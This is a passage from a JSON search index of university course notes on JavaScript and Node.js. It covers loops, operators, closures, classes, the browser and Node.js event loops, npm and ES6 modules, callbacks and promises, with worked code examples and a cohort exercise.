updated.","title":"Local scope"},{"location":"notes/l4_1_web_prog_common_js/#for-in-and-for-of","text":"We could rewrite the for-loop in the following for (let i in kvs) { sum = sum + kvs[i][1]; } In this case i denotes the indices of array kvs . Alternatively, for (let kv of kvs) { sum = sum + kv[1]; } In this case kv denotes an element from the array kvs .","title":"For-in and For-of"},{"location":"notes/l4_1_web_prog_common_js/#while","text":"Besides for-loops, we can repeat operations with while . var i = 0; while (i < kvs.length) { sum = sum + kvs[i][1]; i++; }","title":"While"},{"location":"notes/l4_1_web_prog_common_js/#looping-with-closures","text":"Given an array, we can use .forEach(p) to apply p to each element in the array. In this case the function p does not produce output. kvs.forEach(function (kv) { sum = sum + kv[1]; }); In the above we apply .forEach to an anonymous function add kv[1] to the running sum. Note that in JavaScript, function( args1, ... ) { // body } defines an anonymouse function, alternatively we can write (args1, ..., ) => { // body } If we want to apply a function f to each element in the input array to produce a new array, we use .map(f) . var kvs2 = kvs.map(function (kv) { return [kv[0].toUpperCase(), kv[1]]; }); kvs2; // [['APPLE', 100], ['ORANGE', 50], ['DURIAN', 200]] Note that in JavaScript there is not tuple (1,2,3) .","title":"Looping with closures"},{"location":"notes/l4_1_web_prog_common_js/#javascript-operators","text":"","title":"JavaScript Operators"},{"location":"notes/l4_1_web_prog_common_js/#binary-operators","text":"Operators are predefined symbols in JavaScripts that allows us to compute result. For instance var x = 3; var y = 1; var z = x + y; // z is 4 In the above context, this operator + sums up its given arguments since both are in number type. typeof(x); // number typeof(y); // number The binary operator + is overloaded. var a = \"3\"; var b = 1; var c = a + b; // what is c? In the above + 's left operand is a string and the right is a number, JavaScript performs some implicit type coercion to convert the second operand to string, hence + becomes a string concatenation operator. Another commonly use binary operator in JavaScript is == which used for comparison. var i = 100; var isEven = i % 2 == 0; // isEven is true What about? var isEven2 = i % 2 == \"0\"; // isEven2 is true or false? JavaScript coerces the right operand from string to number for us, hence isEven2 is true However there situations in which such an implicit type coercion is dangerous var isEven3 = i % 2 == \"\"; // isEven3 is true??!? To prevent this kind of situation, it's better to use a coercion-free comparison. var isEven4 = i % 2 === \"\"; // isEven4 is false!","title":"Binary Operators"},{"location":"notes/l4_1_web_prog_common_js/#things-for-you-to-check","text":"Please try to test out the following yourself, (try with different browsers). Add a number to a null value. Add a number to a NaN value. Compare two string values. Compare a number to a string value.","title":"Things for you to check."},{"location":"notes/l4_1_web_prog_common_js/#unary-operators","text":"Operators taking only one operand are called unary operators. For instance, the - symbol is a unary operator as it takes a numerical operand and changes the sign of the operand. The ! symbol is another unary operator which takes boolean expression and return negation of the operand.","title":"Unary Operators"},{"location":"notes/l4_1_web_prog_common_js/#function","text":"Recall that function keyword in JavaScript defines a function. function sum(x, y) { return x + y; } In the above we define a function with name sum which takes two arguments, returns the sum of the two arguments. function incr(x) { return x + 1; }","title":"Function"},{"location":"notes/l4_1_web_prog_common_js/#class","text":"In JavaScript, we can define a custom template for creating objects. class Rect { constructor(w,h) { this.width = w; this.height = h; } area() { return this.width * this.height; } } var r = new Rect(10,5); console.log(r.area()); In the above code snippet, we define a class Rect . Every object instance of Rect has a width and a height attribute. The constructor() is a special method AKA the cosntructor method , which is invoked when we instantiate an object instance from a class via the new keyword. Besides the constructor method, the Rect class defines an area() method which computes the area of the object. To invoke a normal method, we use the . operator. Like many OOP languages, class allows us to define run-time data types by instantiatiating from a fixed template. Note that objects are isolated. var r1 = new Rect(10,5); console.log(r); console.log(r1); With the above we find that r and r1 share the same structure and content. (Note that neither r == r1 nor r === r1 yields true because == and === are checking references, since r and r1 are objects stored in different memory locations, the results are false ).","title":"Class"},{"location":"notes/l4_1_web_prog_common_js/#inheritance-only-available-in-es6-onwards","text":"Since JavaScript version ES6, we can define subclasses using the extends keyword. class Square extends Rect { constructor(s) { super(s,s); this.side = s; } } var s = new Square(10); console.log(s.area()); With inheritence objects instantiated from a subclass inherits methods and attributes belong to the base classes. Most of the modern browsers support ES6. In case you need to handle some legacy browsers, or you would like understand how class and inheritance were compiled, you could read up the references JavaScript prototypes and prototype inheritance https://www.freecodecamp.org/news/prototypes-and-inheritance-in-javascript/#:~:text=In%20JavaScript%2C%20an%20object%20can,from%20other%20objects%20%E2%80%94%20the%20prototypes.","title":"Inheritance (Only available in ES6 onwards)"},{"location":"notes/l4_1_web_prog_common_js/#higher-order-functions","text":"","title":"Higher order functions"},{"location":"notes/l4_1_web_prog_common_js/#functions-as-inputs","text":"We have seen how functions are used in JavaScript in the previous unit. We consider some advanced usage of functions. function incr(x) { return x + 1; } function twice(f,x) { return f(f(x)); } console.log(twice(incr,10)); // 12 In the above we define a function incr which increments a numerical input by 1 . Then we define a function twice , which takes a function argument f and another argument x . Assuming f 's input's domain subsumes the output's domain, in twice , we apply f to x to produce an intermediate result then applies f again to the intermediate result. twice is known as a higher order function as it takes another function has its input argument. Using higher order functions allows us to reuse codes. function dbl(x) { return x * 2; } console.log(twice(dbl,10)); // 40","title":"Functions as inputs"},{"location":"notes/l4_1_web_prog_common_js/#functions-as-returned-values","text":"In situation, we might want to define functions that return another function as result. function part_sum(x) { return (function (y) { return x + y }); } var incr_too = part_sum(1); console.log(twice(incr_too, 10)); In the above, we define a partial sum function, part_sum which takes an input x and returns an anonymous function that expects some input y and returns the sum of x and y . Thanks to the variable scope, the x in the returned function closure refers to the x argument of part_sum . We can now define a function incr_too by applying part_sum to 1 . It should behave the same as incr , since incr_too is a reference to the anonymous function produced by part_sum(1) that expects y and adds 1 to y . In this case, part_sum is also a higher order function as its returned value is another function.","title":"Functions as returned values"},{"location":"notes/l4_1_web_prog_common_js/#functions-as-call-backs","text":"Function call-backs , also known as continuations, turn out to be very useful for us to define operations that should be performed in sequence. For instance, var x = 1; var y = incr(x); var z = dbl(y); console.log(z); In the above we would like to increment x by 1 then multiply the intermediate result y by 2 . With call-backs, we could rewrite the above as function incr_with_callback(x, f) { var r = incr(x); f(r); } function dbl_with_callback(y, g) { var r = dbl(y); g(r); } var x = 1; incr_with_callback(x, function(y){ dbl_with_callback(y, function(z) { console.log(z); }) }) We introduce some variants of incr and dbl by calling the original functions to obtain the result. Instead of returning the results, we pass the results to the call back functions f (or g ). f (and g ) are known as the continuations, which means when the main function terminates, it continues the execution by calling f (and g ). These two versions should produce the same result. One may argue that the second one is too hard to read and does not bring any significant value over the first version.","title":"Functions as call-backs"},{"location":"notes/l4_1_web_prog_common_js/#application-of-call-backs","text":"Call-backs are widely used in JavaScript. One essential usage of call-back is to support asynchronous progamming.","title":"Application of Call-backs"},{"location":"notes/l4_1_web_prog_common_js/#asynchronous-programming","text":"Synchronous programming means instructions are executed one after another. On the other hand, asynchronous programming means instructions are not executed in the order they are structured. We need this \"out-of-order\" execution when there exists some long-running instruction that occurs in the middle of the program, but we do not want this long-running instruction to block the rest of instructions. One possible way to actualize asynchronous programming is to leverage multi-threading, i.e. to spawn a new thread from the main thread to execute the long-running instruction (e.g. what we did using Java in 50.001). However implementing asynchronous programming with multi-threading might lead to extra memory overhead, because each thread needs to pre-allocate and maintain its own call stack space and heap memory, e.g. (in older version of Java, the default heap size for a thread is 2MB). In a UI-based application, most of the asynchronous tasks do not require such heap space, e.g. 1. we need a separate instruction sequence to periodically check whether the button is clicked, or 2. we need a separate instruction sequence to call an exernal API and wait for the result to return.","title":"Asynchronous Programming"},{"location":"notes/l4_1_web_prog_common_js/#single-threaded-event-driven-programming","text":"JavaScript takes a different approach in supporting asynchronous programming without using multi-threading. From this point onwards, we narrow the definition of \"callbacks\" to be the functions that will be invoked when an event occurs. Like many other languages, JavaScript executes a program with a call stack and a heap. Heap is a memory space for us to store non-primitive value such as objects, strings and arrays. For now our focus is on the call stack. When a JavaScript starts a main frame is added to the call stack, global variables are stored in the main frame. When there is a function call, a new frame is placed on-top of the call stack. Local variables with primitive values are stored inside the frame. The frame is then popped when the function returns. The main frame is popped when all instructions in the JavaScript program has been executed. For example function f(x) { var y = x + 1; return g(y); } function g(z) { return z*2; } f(10); In the above program, we define two functions f and g . The call stack begins with the folowing frame. graph LR; id3(main) The main program call f(10) . We place a new frame on the call stack. When executing f(10) , we assign 10+1 to a local variable y in the call frame of f(10) . graph LR; id2(\"f(10)<br/>y=11\") id3(main) Before returning the result, we call g(y) which is g(11) which creates another call frame. The following diagram shows the call stack with three frames when the program execution point is right before return z*2 . graph LR; id1(\"g(11)\") id2(\"f(10)<br/>y=11\") id3(main) As g(11) call returns we remove the top most frame, i.e. g(11) , then back to the frame f(10) . graph LR; id2(\"f(10)<br/>y=11\") id3(main) We return 22 as result and remove the second frame, f(10) . graph LR; id3(main) Lastly, we remove the main frame as we reach to the end of the program. Things become more interesting in the presence of call-back functions associated with some UI elements. Recall one of our earlier examples, function handleButton1Click() { var textbox1 = document.getElementById(\"textbox1\"); var span1 = document.getElementById(\"span1\"); span1.innerHTML = textbox1.value; } function run() { var button1 = document.getElementById(\"button1\"); button1.addEventListener(\"click\", handleButton1Click); } document.addEventListener( \"DOMContentLoaded\", run); The program contains three portions, the two function definitions and a statement. JavaScript run-time in the browser executes them sequentially and synchronously, in the main call frame. To illustrate the step by step program execution let's consider the following table. The first column is the program counter. The second column captures the call stack, for simplicity, we use python's style list to represent a stack, where the left most element the bottom frame. The third column is a mapping from (UI) events to call-back functions, we use Python's style dictionary syntax. The fourth coulumn is the callback queue (again we use python's list style) program counter (line num) call stack event reg table callback queue 1 [main] {} [] 6 [main] {} [] 10 [main] { DomContentLoaded : run } [] The run-time first execute the function declaration in line 1, in call frame main , which does not affect the event registeration table nor the callback queue. Similar observation applies when it move on to execute the function declaration in line 6. When the program counter is at line 10, we are add the last statement of the main program. Add an event listener to the even DOMContentLoaded , which creates an entry to the even registration table, mapping DOMContentLoaded to the function run as callback. After line 10, the call stack becomes empty as main ended. However the JavaScript run-time for rendering this web page is still running. It is executing an event-loop, in which it periodically check whether there is anything is the callback queue. At this point in time the browser continues to render the HTML page. When the HTML document is fully rendered, the browser triggers an DomContentLoaded event. At this point the callback function run associated with the event is enqueued to the callback queue. Since the call stack is empty and the callback queue is not, the JavaScript run-time dequeues run from the callback queue and creates a call frame in the call stack. It continues to move the program counter from lines 7-9. program counter (line num) call stack event reg table callback queue ... ... ... ... [] { DomContentLoaded : run } [ run ] 7 [ run ] { DomContentLoaded : run } [] 8 [ run ] { DomContentLoaded : run } [] 9 [ run ] { DomContentLoaded : run , button1.click : handleButton1Click } [] At the end of line 9, a new event ( button1 being clicked) is being registered, mapping to handleButton1Click . The call stack becomes empty again. The JavaScript run-time goes into the event loop again, waiting for next event to take place. When someone clicks on the button button1 , the callback function handleButton1Click will be enqeued into the callback queue. The run-time will \"move\" it into the call stack to execute it.","title":"Single threaded Event-driven Programming"},{"location":"notes/l4_1_web_prog_common_js/#we-have-purposely-ignored-something","text":"Actually, besides the callback, there are something called promises which enable JavaScript code to support asynchronous programming. We will discuss it in details in the next class.","title":"We have purposely ignored something ..."},{"location":"notes/l4_1_web_prog_common_js/#cohort-exercise","text":"(Not Graded) Add some console.log() to the buttonandtext.js and open buttonandtext.html to observe in what order the call backs are executed. (Graded) Complete the following HTML and JavaScript codes, so that when the button Submit is clicked, the min and the max of the sequence of numbers (seperated by \",\") entered in the input text box will be displayed in the span elements. <!DOCTYPE html> <html> <head> <script src=\"minmax.js\"> </script> <meta charset=\"utf-8\"/> <title>50.003 sample code: Min and Max </title> </head> <body> <div>Your input: <input id=\"textbox1\" type=\"text\" /> </div> <div>Min: <span id=\"min\"></span></div> <div>Max: <span id=\"max\"></span></div> <div><button id=\"button1\">Submit</button></div> </body> </html> function numbers(l) { var o = []; for (let i in l) { var n = parseInt(l[i],10); if (!isNaN(n)) { o.push(n); } } return o; } // input: an array of numbers // output: an object containing 'min', with the minimum of the array and 'max' the maximum of the array. function min_max(a) { var min = null; var max = null; // TODO: fixme return { 'min' : min, 'max' : max} } function handleButton1Click() { var textbox1 = document.getElementById(\"textbox1\"); var min = document.getElementById(\"min\"); var max = document.getElementById(\"max\"); var items = textbox1.value.split(\",\"); var obj = min_max(numbers(items)); min.innerHTML = obj['min']; max.innerHTML = obj['max']; } function run() { var button1 = document.getElementById(\"button1\"); // TODO: fixme } document.addEventListener( \"DOMContentLoaded\", run);","title":"Cohort Exercise"},{"location":"notes/l4_2_nodejs/","text":"50.003 - Node.js Learning Outcomes By the end of this unit, you should be able to Name the differences between frontend and backend development for web application Describe the use of a package/project manager for node.js Describe the run-time system of node.js Compare the difference between event callbacks and promises. Analyse the run-time behavior of an asynchronous node.js program Frontend vs Backend In many web applications, it is insufficient to run the application in the browser which is a run-time system hosted in the user's device, such as desktop, laptop or mobile phone. An obvious reason is that certain computation must not be executed on the user's device due to security and integrity, for instance, transferring balance from one account to another. These highly sensitive operations should be executed at the server ends, which is known as the \"backend\". Node.js There are many options of implementing the backend applications, e.g. Spring with Java, Django with Python, Flask with Python, Node.js with JavaScript. Node.js is a run-time system to run JavaScript applications without the browser (and its event APIs), for instance document is no longer a predefined reference in Node.js. Hello World The hello world program in Node.js is not too far apart from the one in the browser. Suppose we have a JavaScript file name hello.js with the following content, console.log(\"hello\"); To execute it, we need the node.js run-time to be installed, for installation, please refer to https://nodejs.org/en/download Then in the terminal, node hello.js We see the message hello , being printed in the terminal. Since it is using the same language as the browser run-time, we will skip those common language features and focus on the difference. Node.js Project/Package Manager In most of the cases, we develop projects based on existing libraries, modules and packages. To better manage all these dependencies, we need a project management tool. npm is the mostly commonly used too in the node.js community. Its role is similar to pip for python and gradle for java. To start a Node.js project, mkdir myproj cd myproj npm init To add a dependency, we type npm i xhr2 where xhr2 is the library that we would like to install as a dependency for our current project. After executing the above command, we observe that the xhr library is downloaded to a temporary forder node_modules and the following \"dependencies\": { \"xhr2\": \"^0.2.1\" } is added to the project definition file package.json . When we clone the project to a new machine, (for development installation or deployment purpose), we can download all the dependencies defined by package.json by running npm i Next we would like to enable the ES6 module mode in this project. We will explain what is ES6 module mode shortly. Use an editor to add the following entry to the package.json file. { \"name\": \"myproj\", \"version\": \"1.0.0\", \"description\": \"\", \"main\": \"index.js\", \"scripts\": { \"test\": \"echo \\\"Error: no test specified\\\" && exit 1\" }, \"type\": \"module\", // enable module type \"author\": \"\", \"license\": \"ISC\", \"dependencies\": { \"xhr2\": \"^0.2.1\" } } CommonJS vs ES6 modules Module system allows one to put common codes in a module which can be reused by many different use sites. For instance, consider the following JavaScript program mymath.js const pi = 3.14159 const e = 2.71828 module.exports = {pi, e}; in which we define two constant variables pi and e , and export them, so that when mymath.js is being imported in another JavaScript program, these two constant variables can be reused. Traditionally, In Common JavaScript (dubbed as CJS), we import predefined references from another JS file, via the require() function. const mymath = require('./mymath.js'); console.log(mymath.pi); In ES6 onwards, the following \"better\" syntax was instroduced, Exporting const pi = 3.14159 const e = 2.71828 export {pi, e}; Importing import {pi} from './mymath.js'; console.log(pi); For the rest of this unit, we will stick to the ES6 import syntax. Let's consider the following JavaScript program circle.js that makes use of mymath.js . import {pi} from \"./mymath.js\" class Circle { constructor(r) { this.r = r; } area() { return this.r**2 * pi; } } export default Circle; In the above, we make use of the pi defined in mymath.js to compute the area of a Circle object. And the end of the file, we export the class definition Circle with a default modifier. Note that there can only one name to be exported if default is used. Being a default export, we do not need to surround it with {} when importing. In CommonJS (pre ES6), we write modules.export = Circle instead. Consider the following program moduletest.js import Circle from './circle.js'; var circle = new Circle(10); console.log(circle.area()); Node.js Event-loop Like JavaScript run-time in the browser, when the main program ended, Node.js run-time goes into an event loop. The Node.js event-loop consists of the following steps, (AKA phases.) \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510 \u250c\u2500>\u2502 timers \u2502 \u2502 \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518 \u2502 \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2534\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510 \u2502 \u2502 pending callbacks \u2502 \u2502 \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518 \u2502 \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2534\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510 \u2502 \u2502 idle, prepare \u2502 \u2502 \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518 \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510 \u2502 \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2534\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510 \u2502 incoming: \u2502 \u2502 \u2502 poll \u2502<\u2500\u2500\u2500\u2500\u2500\u2524 connections, \u2502 \u2502 \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518 \u2502 data, etc. \u2502 \u2502 \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2534\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510 \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518 \u2502 \u2502 check \u2502 \u2502 \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518 \u2502 \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2534\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510 \u2514\u2500\u2500\u2524 close callbacks \u2502 \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518 timers: this phase executes callbacks scheduled by setTimeout() and setInterval(). pending callbacks: executes I/O callbacks deferred to the next loop iteration. idle, prepare: only used internally. poll: retrieve new I/O events; execute I/O related callbacks (almost all with the exception of close callbacks, the ones scheduled by timers, and setImmediate()); node will block here when appropriate. check: setImmediate() callbacks are invoked here. close callbacks: some close callbacks, e.g. socket.on('close', ...). Between each run of the event loop, Node.js checks if it is waiting for any asynchronous I/O or timers and shuts down cleanly if there are not any. Now we focused on call-backs and asychronous tasks (The 2nd Phase, and 4th Phase). Node.js I/O Since node.js applications are meant for the backend system, there is no need to handle the I/O with the browser interface, instead we find the following I/O operations Network I/O File I/O other I/Os Let's consider an example of using network I/O, import XMLHttpRequest from 'xhr2'; var xhr = new XMLHttpRequest(); var args = process.argv; if (args.length > 2) { var input = args[2]; xhr.onreadystatechange = function() { if (xhr.readyState == 4) { var res = xhr.responseText; console.log(res); } }; xhr.open('GET', `https://postman-echo.com/get?x=${input}`); xhr.send(); } else { console.log(\"USAGE: node index.js input\"); } The first statement, we import the XMLHttpRequest class from the package xhr2 . (We don't need to import it when the code is executed in the browser as all browser has XMLHttpRequest class builtin in the run-time, but this is not the case for node.js). In the second statement, we instantiate an XMLHttpRequest request object. In the third line, we read the command line arguments into a variable args . The following if-else statement check whether the user supplies enough arguments. In the then branch, we extract the third argument, which will be used as the input parameters in the API call. Before calling the API, we set-up a callback in the event of the state of the request changing. As we discussed earlier, the node.js run-time has an event loop, which periodically checks for events (Phase 4). In this case, the change of state in the XMLHttpRequest object is one of the events it is checking. When the event occurs, i.e. the state of the object changes, the callback function will be placed in the callback queue. When the main call stack is empty, the callback will be put into the callstack for execution. In the callback function, we check whether the state is 4 , which stands for DONE . When the call is done, we extract the response text and print it out. After setting up the callback function, we open the request and submit it. If we execute this script, we will observe the API request's repsonse being printed on the command line. Next let's consider another example that interacts with file system via the node:fs library (which is builtin). import { writeFile } from 'node:fs'; const txt = \"hello\"; writeFile('save.txt', txt, (err) => { if (err) throw err; console.log('The file has been saved!'); }); In the second statement,we define the text data to be written to the file. In third statement we write the result to a file named save.txt , note that writeFile() takes three arguments. The last argument is a callback function, whose argument err is potentially an error. In this case, when the error is present, we propogate the error by throwing it as an excception, otherwise, we print a message. Callback Pyramid Let's say now we would like to combine the two examples, first we would like to make an API call, when the call is returned successfully, we save the result of the API call into a file. import XMLHttpRequest from 'xhr2'; import { writeFile } from 'node:fs'; var xhr = new XMLHttpRequest(); var args = process.argv; if (args.length > 2) { var input = args[2]; xhr.onreadystatechange = function() { if (xhr.readyState == 4) { var res = xhr.responseText; writeFile('api_result.txt', res, (err) => { if (err) throw err; console.log('The file has been saved!'); }); } }; xhr.open('GET', `https://postman-echo.com/get?x=${input}`); xhr.send(); } else { console.log(\"USAGE: node index.js input\"); } Note that we have to \"embed\" the routine of writing the result res into a file api_result.txt deep inside the callback of xhr request, the writeFile() call itself has another callback. If we have many asynchronous steps following one another, the code will become complicated and hard to read. Promise Promise is a builtin class in JavaScript, which allows us to build a sequence of asynchronous tasks without nesting call-backs. A Promise object can be instantiated passing in a function as argument. This function argument is called the executor . An executor function is a higher order function that takes two functions as arguments, commonly named as resolve and reject . resolve is applied to the result of the promise during normal execution, reject is applied when some error occurs, (cf. throw ). In the following we instantiate a Promise object that always resolves. let alwaysWork = new Promise(function(resolve, reject) { resolve(); }) Let's consider a more interesting example using Promise . function asyncCounter() { var count = 0; return new Promise( (resolve, reject) => { resolve(count); }); } function incr(count) { console.log(count); return ++count; } let counter = asyncCounter(); counter .then( incr ) .then( incr ) .then( incr ) In the above we instantiate an asychronous counter by calling the function asyncCounter() , which initializes a local variable and return a promise object that resolves with the variable, recall that resolve is the continuation (i.e. the next step of the promise). Next we invoke .then method of this counter (promise) three times. We can chain the invocation because, .then method takes a method and returns a new promise. In this case, we use the incr function as the parameter of .then . In the incr function, we print the count variable and return the result of incrementing count by 1. One may point out that incr does not return a new Promise object, how could this work? Behind the scene, node.js rewrite the incr function as function incr(count) { console.log(count); return new Promise((resolve, reject) => resolve(++count)); } When we execute the above we will see the following printed on the terminal. 0 1 2 Now let's make some changes to the example, so that the incr function will stop incrementing the counter when the limit is reached. We modify the incr function as follows, // definition of asyncCounter() remains unchanged. function incr(count) { console.log(count); return new Promise((resolve, reject) => { if (count > 1) { reject(\"limit reached\"); } else { resolve(++count); } }); } In the above, incr returns a new promise object which does not always resolve with ++count . In the event that the current count value is greater than 1, it will reject the rest of the computation, by applying reject . Now coming back to the use of the counter , we chain it with incr 4 times, followed by a call to a catch() method invocation and consumes the error raised by any of the reject function call. let counter = asyncCounter(); counter .then( incr ) .then( incr ) .then( incr ) .then( incr ) .catch( (reason) => console.log(`rejected: ${reason}.`)) calling the above, we have 0 1 2 rejected: limit reached. We now argue that we don't experience any asynchronousness here. Let's modify the example by attaching a prefix to the message printed by the incr function and creating a second counter. 1: function asyncCounter() { 2: var count = 0; 3: return new Promise( (resolve, reject) => { 4: resolve(count); 5: }); 6: } 7: 8: function incr(id) { 9: return function (count) { 10: console.log(`${id}:${count}`); 11: return new Promise((resolve, reject) => { 12: if (count > 1) { 13: reject(\"limit reached\"); 14: } else { 15: resolve(++count); 16: } 17: }); 18: }; 19:} 20: 21:let counter1 = asyncCounter(); 22: 23:counter1 24: .then( incr(\"c1\") ) 25: .then( incr(\"c1\") ) 26: .then( incr(\"c1\") ) 27: .catch( (reason) => console.log(`rejected: ${reason}.`)) 28: 29:let counter2 = asyncCounter(); 30: 31:counter2 32: .then( incr(\"c2\") ) 33: .then( incr(\"c2\") ) 34: .then( incr(\"c2\") ) 35: .catch( (reason) => console.log(`rejected: ${reason}.`)) 36: 37:process.nextTick(() => console.log(\"tick!\")); 38:console.log(\"main done!\") In the 2nd last statement, we call process.nextTick() which prints a tick! message at the next event loop cycle. When executing the above example, we observe main done! c1:0 c2:0 c1:1 c2:1 c1:2 c2:2 rejected: limit reached. rejected: limit reached. tick! It reveals that the execution of the incr method calls for both promise objects are interleaved. The tick message shows that all these happens in one single event loop cycle. Node.js run-time model Recall from the previous class, we studied the JavaScript run-time in the browser, which has a call stack, a heap, an event registry and a callback queue. 1. The run-time executes the JavaScript main program in the call stack until no more stack frame left, and goes into the event loop. 2. When there is an event triggered, the callback function associated with the event (in the event registery) will be added to the callback queue. 3. In an event loop cycle, when there is no more frame in the call stack but there is some item in the call back queue, the run-time will dequeue the callback from the queue and add it to the call stack. With the presence of Promise , there are more than one callback queues. For simplicity, let's say there are two. 1. The macro task queue, which is same as the callback queue that stores callback associated with events. 2. The micro task queue, which stores callbacks associated with promises. Given that promises are special builtin of Node.js run-time, they are treated \"differently\" when executed. When a promise is instantiated, its excutor function is executed upto the resolve(...) (or reject(...) ) statement. The call of resolve(...) (or reject(...) ) is enqueued into the micro task queue. In an event loop cycle, when the call stack is empty, the run-time checks whether the micro task queue contains any item before checking the macro task queue. We illustrate the execution the last example in the following table, for simplicity, we omit the event registry table, and the macro task queue since they are empty in this example. We are interested in the program counter, the call stack, the micro task queue, a list of promises. program counter (line num) call stack micro queue promises 21 [main] [] {} 1 [main, asyncCounter] [] {} 3 [main, asyncCounter] [] {promise@21} 23 [main] [] {promise@21} 8-9 [main, incr] [promise@21.resolve(0)=incr(\"c1\")(0) ] {promise@21} 23 [main] [promise@21.resolve(0)=incr(\"c1\")(0) ] {promise@21} In the above we show the execution of the program from line 1 to line 27. 1. Line 1 defines function aysncCounter 1. Line 8 defines function incr . 1. Line 21, asyncCounter() is invoked, the program counter moves back to line 2 then line 3, 1. Line 3, a promise object promise@21 is instantiated, its body is executed upto the call to resolve , since at this stage, we are not sure what the resolve function could be. We add promise@21 to the set of promises. We added the suffix @21 to indicate that the promise object was instantiated and with reference at line 21. This helps us to reason about the execution. 1. Line 23, promise@21 is being chained with .then(incr(\"c1\")) , we first move the program pointer back to line 8-9 and compute incr(\"c1\") , which add the function call to call stack 1. Line 9, we return a function, this function will be the resolve function of the promise@21 object. One may ask what about the reject function of the same promise object, since in this case the reject is never used, we could omit it. To be precise, we can say that it can be an identity reject function. js (err) => new Promise((resolve, reject) => reject(err)); We've done with the call incr(\"c1\") and return to the call site Line 24. It is another chain with .then . However the value to be produced here is the result of a task from the micro task queue, we skip the rest. If we continue to execute the rest of the program (ignoring lines 37-38), we will end up with program counter (line num) call stack micro queue promises 29 [main()] [promise@21.resolve(0)=incr(\"c1\")(0) ] {promise@21, promise@29} 1 [main(), asyncCounter()] [promise@21.resolve(0)=incr(\"c1\")(0)] {promise@21, promise@29} 3 [main(), asyncCounter()] [promise@21.resolve(0)=incr(\"c1\")(0)] {promise@21, promise@29} 31 [main()] [promise@21.resolve(0)=incr(\"c1\")(0)] {promise@21, promise@29} 8-9 [main(), incr()] [promise@21.resolve(0)=incr(\"c1\")(0), promise@29.resolve(0)=incr(\"c2\")(0) ] {promise@21, promise@29} 31 [main()] [promise@21.resolve(0)=incr(\"c1\")(0), promise@29.resolve(0)=incr(\"c2\")(0) ] {promise@21, promise@29} eof [] [promise@21.resolve(0)=incr(\"c1\")(0), promise@29.resolve(0)=incr(\"c2\")(0) ] {promise@21, promise@29} At this stage, the call stack is empty, the node.js run-time dequeues the first task from the micro task queue, i.e. promise@21.resolve(0) . incr(\"c1\")(0) prints c1:0 , generates a new promise promise@24 (because the promise object will be returned to the chaining at line 24). program counter (line num) call stack micro queue promises 9-18 [function@9(0)] [ promise@29.resolve(0)=incr(\"c2\")(0) ] {promise@21, promise@29, promise@24} Since the promise at line 24 become known, thanks to the .then(incr(\"c1\")) a line 25, we resolve the promise at line 24 and enqueue to the micro queue. program counter (line num) call stack micro queue promises 25 [] [ promise@29.resolve(0)=incr(\"c2\")(0), promise@24.resolve(1)=incr(\"c1\")(1) ] {promise@21, promise@29, promise@24} Since the call stack is empty, we dequeue the next item from micro task queue, which is program counter (line num) call stack micro queue promises 9-18 [function@9(0)] [ promise@24.resolve(1)=incr(\"c1\")(1) ] {promise@21, promise@29, promise@24, promise@32} Since the promise at line 32 become known, thanks to the .then(incr(\"c2\")) , we resolve the promise at line 32 and enqueue to the micro queue. program counter (line num) call stack micro queue promises 33 [] [ promise@24.resolve(1)=incr(\"c1\")(1), promise@32.resolve(1)=incr(\"c2\")(1) ] {promise@21, promise@29, promise@24, promise@32} By repeating the similar steps, we get c1:0 c2:0 c1:1 c2:1 c1:2 c2:2 rejected: limit reached. rejected: limit reached. Mixing callbacks and promises Returning to the earlier example with API call and file write operations, we now can rewrite the example as follows by introducing promises. 1: import XMLHttpRequest from 'xhr2'; 2: import { writeFile } from 'node:fs'; 3: 4: var xhr = new XMLHttpRequest(); 5: var args = process.argv; 6: if (args.length > 2) { 7: var input = args[2]; 8: let apiPromise = new Promise( function (resolve, 